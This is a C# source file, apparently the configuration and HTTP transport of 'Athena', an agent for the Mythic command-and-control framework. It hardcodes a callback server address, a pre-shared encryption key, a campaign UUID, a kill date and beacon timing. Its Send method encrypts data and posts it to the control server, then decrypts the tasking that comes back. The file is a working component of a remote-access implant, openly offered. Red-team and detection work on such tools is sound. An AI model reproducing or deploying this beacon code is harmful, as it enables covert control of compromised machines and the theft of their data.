﻿using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class MythicConfig
    {
        public HTTP currentConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public SmbServer smbConfig { get; set; }

        public MythicConfig()
        {

            this.uuid = "44dca97b-44fe-4251-8e67-11138ef4fe1e";
            DateTime kd = DateTime.TryParse("2022-09-15", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("1", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new HTTP(this.uuid);
            this.smbConfig = new SmbServer();
        }
    }
    public class HTTP
    {
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public string getURL { get; set; }
        public string postURL { get; set; }
        public string psk { get; set; }
        public DateTime killDate { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        //Change this to Dictionary or Convert from JSON string?
        public string headers { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        public PSKCrypto crypt { get; set; }
        public bool encrypted { get; set; }
        private HttpClient client { get; set; }

        public HTTP(string uuid)
        {
            this.client = new HttpClient();
            int callbackPort = Int32.Parse("80");
            string callbackHost = "http://10.10.50.43";
            string getUri = "q";
            string queryPath = "index";
            string postUri = "data";
            this.userAgent = "user-agent";
            this.hostHeader = "%HOSTHEADER%";
            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}";
            this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.psk = "nJLF369YT2M2F6G+Qn6oOfbxhTsvGslhIjZEeLcktoU=";
            //Doesn't do anything yet
            this.encryptedExchangeCheck = bool.Parse("true");

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }
        }
        public async Task<string> Send(object obj)
        {
            try
            {

                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }

                var response = await this.client.PostAsync(Globals.mc.MythicConfig.currentConfig.postURL, new StringContent(json));
                string msg = response.Content.ReadAsStringAsync().Result;

                if (this.encrypted)
                {
                    msg = this.crypt.Decrypt(msg);
                }
                else
                {
                    msg = Misc.Base64Decode(msg).Substring(36);
                }
                return msg;
            }
            catch
            {
                return "";
            }
        }
    }
}
